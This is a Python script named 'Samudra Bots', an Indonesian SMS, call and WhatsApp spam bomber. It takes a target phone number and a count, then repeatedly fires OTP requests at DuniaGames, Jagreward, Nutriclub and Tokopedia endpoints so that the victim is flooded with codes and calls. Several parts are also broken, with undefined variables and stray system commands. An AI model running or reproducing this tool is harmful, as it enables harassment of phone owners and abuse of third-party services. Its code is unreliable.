# -*- coding: utf-8 -*-
# -*- Samudra____Bots -*-
# -*- version: Bots_Spam -*-
# -*- creator: Samudra -*-
import os,sys,time,requests,json,random,re
from requests import post
from requests import get
os.system("kojomin dong")
r = requests.Session()
samudra_point = 1
# ━━━━━{ sᴀмuᴅʀᴀ___ʙoтs }━━━━━
def mr_samudra_kelon():
  samudrareq = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if json.loads(samudrareq.text)["StatusMessage"] == 'Request misscall berhasil':
       sukses("1","call","kelonjamaah")
       time.sleep(30)
  else:
       gagal("1","call","kelonjamaah")
       time.sleep(30)
def mr_samudra_jag():
  samudra_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+mudranom)
  samudra_json = json.loads(samudra_request.text)
  if samudra_json["message"] == 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.':
       sukses("2","call","jagreward")
       time.sleep(30)
  else:
       print (f'   \033[1;37m[\033[31m\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan sudah limit! \033[31m ')
       time.sleep(30)
def mr_x():
    time.sleep(1)
    os.system("clear")
    print ("\033[1;37m[\033[1;30m1\033[1;37m] \033[36m Subscribe Youtub Samudra yo \033[1;37mkeder \033[36m cuk :v")
    time.sleep(1)
    os.system("xdg-open https://youtube.com/channel/UCMNItaBMNDFzRorHsvvYA7g")
    time.sleep(3)
    print ("\033[1;37m[\033[1;30m2\033[1;37m] \033[36m Join \033[1;37mSamudra Bots \033[36m cuk :v")
    time.sleep(1)
    os.system("xdg-open https://chat.whatsapp.com/Bt5hPam3L155ydZTjURplX")
    time.sleep(3)
    os.system("clear")
# ━━━━━{ sᴀмuᴅʀᴀ___ʙoтs }━━━━━
def mr_samudra_input():
    subs_mr_samudra = input("   \033[1;37m\033[31m➤ \033[36m")
    if subs_mr_samudra == "1":
         samudra_point = 1
         print ("\033[1;30m<━━━━━━━━━━━━[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]━━━━━━━━━━━━>")
         print (". ___________________")
         print ("▕╮╭┻┻╮╭┻┻╮╭▕╮╲")
         print ("▕╯┃╭╮┃┃╭╮┃╰▕╯╭▏")
         print ("▕╭┻┻┻┛┗┻┻┛   ▕  ╰▏")
         print ("▕╰━━━┓┈┈┈╭╮▕╭╮▏")
         print ("▕╭╮╰┳┳┳┳╯╰╯▕╰╯▏")
         print ("▕╰╯┈┗┛┗┛┈╭╮▕╮┈▏")
         print (" ☠↘sᴀмuᴅʀᴀ__ʙoтs↙☠")
         print ("☾тᴇᴀм sᴀмuᴅʀᴀ___ʙoтs☽")
         print ("cʀᴇᴀтoʀ sᴀмuᴅʀᴀ__ʙoтs☛ʙʏ : sᴀмuᴅʀᴀ")
         telkom_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         inquiryId_telkom = "219424679"
         telkom = ("0"+telkom_0)
         dark={
         "phoneNumber":telkom,
         "inquiryId":inquiryId_telkom
         }
         print ("\033[1;30m<━━━━━━━━━━[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]━━━━━━━━━━>")
         for i in range(int(jumlah)):
             samudrao=requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers=mr_telkom,json=samudra).text
             if 'Field ini harus diisi dengan nomor Telkomsel' in samudrao:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mNo Target Harus Menggunakan Telkomsel! \033[31m ')
                  time.sleep(2)
                  print ("\033[1;30m<━━━━━━━━━━[\033[1;33;41m • \033[1;37mSTOP \033[1;33m• \033[0m\033[1;30m]━━━━━━━━━━>")
                  break
             if 'Maaf, Anda belum melakukan konfirmasi OTP di transaksi sebelumnya, silakan coba kembali setelah 1 menit' in samudrao:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan inquiryId sedang di gunakan!, Mohon Coba Lagi! \033[31m ')
             else:
                  print (f'   \033[1;37m[\033[1;32m{dark_point}\033[1;37m] \033[1;32mTerkirim \033[31m ')
                  samudra_point += 1
             samudra_time(00, 60)
    elif subs_mr_samudra == "3":
         samudra_point = 1
         print ("\033[1;30m<━━━━━━━━━━[\033[1;33;41m • \033[1;37msᴀмuᴅʀᴀ \033[1;33m• \033[0m\033[1;30m]━━━━━━━━━━>")
         xl_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         no = ("0"+xl_0)
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         InquiryId_xl = "237992422"
         id_xl = "237775262"
         samudra_user = {
         'User-Agent' : 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
         'Accept-Encoding' : 'gzip, deflate',
         'Connection' : 'keep-alive',
         'Origin' : 'https://accounts.tokopedia.com',
         'Accept' : 'application/json, text/javascript, */*; q=0.01',
         'X-Requested-With' : 'XMLHttpRequest',
         'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
         }
         regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = samudra_user).text
         mudra = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
         mr_samudra_to_the_moon = {
         "otp_type" : "116",
         "msisdn" : no,
         "tk" : mudra,
         "email" : '',
         "original_param" : "",
         "user_id" : "",
         "signature" : "",
         "number_otp_digit" : "6"
         }
         mr_samudra_bruh = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = samudra_user, data = mr_samudra_to_the_moon).text
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(int(jumlah)):
             if 'Anda sudah melakukan 3 kali pengiriman kode' in mr_samudra_bruh:
                  print(f'   \033[1;37m[\033[31m{samudra_point}\033[1;37m] \033[1;37mSilahkan Coba Ulang Setelah 5 menit! \033[31m ')
                  time.sleep(5)
                  samudra_point += 1
             else:
                  print(f'   \033[1;37m[\033[1;32m{samudra_point}\033[1;37m] \033[1;32mTerkirim \033[31m ')
                  time.sleep(5)
                  samudra_point += 1
    elif subs_mr_samudra == "2":
         samudra_point = 1
         print ("\033[1;30m<━━━━━━━━━━[\033[1;33;41m • \033[1;37msᴀмuᴅʀᴀ \033[1;33m• \033[0m\033[1;30m]━━━━━━━━━━>")
         mudranom = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         no = ("0"+mudranom)
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         hd = {
         "accept": "text/html, application/xhtml+xml, application/json, */*",
         "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
         "content-length": "166",
         "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
         "origin": "https://h5.rupiahcepatweb.com",
         "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
         "sec-fetch-dest": "empty",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-site",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
         }
         dt = {"mobile":no,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
         data = json.dumps(dt)
         print ("\033[1;30m<━━━━━━━━━━[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]━━━━━━━━━━>")
         for i in range(int(jumlah)):
             samudra_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+mudranom)
             samudra_json = json.loads(samudra_request.text)
             if 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.' in samudra_request:
                  print (f"   \033[1;37m[\033[1;32m{samudra_point}\033[1;37m] \033[1;32mTerkirim \033[31m")
                  time.sleep(30)
                  samudra_point += 1
             else:
                  print (f'   \033[1;37m[\033[31m{samudra_point}\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan sudah limit! \033[31m ')
                  time.sleep(30)
                  samudra_point += 1
    elif subs_mr_samudra == "4":
         os.system("xdg-open https://chat.whatsapp.com/Bt5hPam3L155ydZTjURplX")
         print ("")
    else:
         time.sleep(2)
         print ("\033[1;37m[\033[31m•\033[1;37m] Command: "+subs_mr_samudra+" not found")
         time.sleep(3)
         os.system("clear")
         banner_sampekok_subs_mr_samudra()
def banner_sampekok_subs_mr_samudra():


    print (" тᴇᴀм sᴀмuᴅʀᴀ___ʙoтs")
    print ("                     <,︻╦̵̵̿╤━ ҉     ~  •")
    print ("        █۞█████████████]▄▄▄▄▃●●")
    print ("    ▂▄▅█████████████████████▅▄▃▂")
    print ("   [██████████████████████████████████]")
    print ("   [███████████████████████████████████]")
    print ("   ⊙⊙▲⊙▲⊙▲⊙▲⊙▲◥⊙⊙▲⊙▲⊙")
    print ("████████████████████████████████████")
    print ("█████████████    • ________________")
    print ("█████████████   ▕╮╭┻┻╮╭┻┻╮╭▕╮╲")
    print ("█████████████   ▕╯┃╭╮┃┃╭╮┃╰▕╯╭▏")
    print ("█████████████   ▕╭┻┻┻┛┗┻┻┛   ▕  ╰▏")
    print ("█████████████   ▕╰━━━┓┈┈┈╭╮▕╭╮▏")
    print ("█████████████   ▕╭╮╰┳┳┳┳╯╰╯▕╰╯▏")
    print ("█████████████   ▕╰╯┈┗┛┗┛┈╭╮▕╮┈▏")
    print (" ☠↘sᴀмuᴅʀᴀ__ʙoтs↙☠ █████████████")
    print ("☾тᴇᴀм sᴀмuᴅʀᴀ___ʙoтs☽█████████████")
    print ("cʀᴇᴀтoʀ ☛ʙʏ : sᴀмuᴅʀᴀ   █████████████")
    print ("████████████████████████████████████")
    print ("   \033[1;37m\033[31m>\033[1;37m Status Otp\033[31m:\033[1;37m\033[1;32m Running By Samudra")
    print ("   \033[1;37m\033[31m>\033[1;37m Version\033[31m:\033[1;37m\033[1;37m 1\033[31m.\033[1;37m8")
    print ("")
    print ("    \033[1;37m\033[31m\033[1;33m1\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSamudra Spam Sms \033[31m(\033[36mDuniaGames\033[31m) ")
    print ("    \033[1;37m\033[31m\033[1;33m2\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSamudra Spam Call \033[31m(\033[36mJagreward\033[31m) ")
    print ("    \033[1;37m\033[31m\033[1;33m3\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mSamudra Spam Whatsapp \033[31m(\033[36mTokopedia\033[31m) ")
    print ("    \033[1;37m\033[31m\033[1;33m4\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mJoin Grup Samudra Bots \033[31m(\033[32mWhatsapp\033[31m) ")
    print ("")
    mr_samudra_input()
def samudra_time(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        print(f'   \033[1;37m[\033[1;35m#\033[1;37m] waiting (\033[1;32m{secs:02d}\033[1;37m)', end='\r')
        time.sleep(1)
        total_second -= 1

mr_telkom={
'Host':'api.duniagames.co.id',
'content-length':'50',
'accept':'application/json, text/plain, */*',
'sec-ch-ua-mobile':'?0',
'save-data':'on',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
'content-type':'application/json',
'origin':'https://duniagames.co.id',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://duniagames.co.id/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
mr_x()
banner_sampekok_subs_mr_samudra()
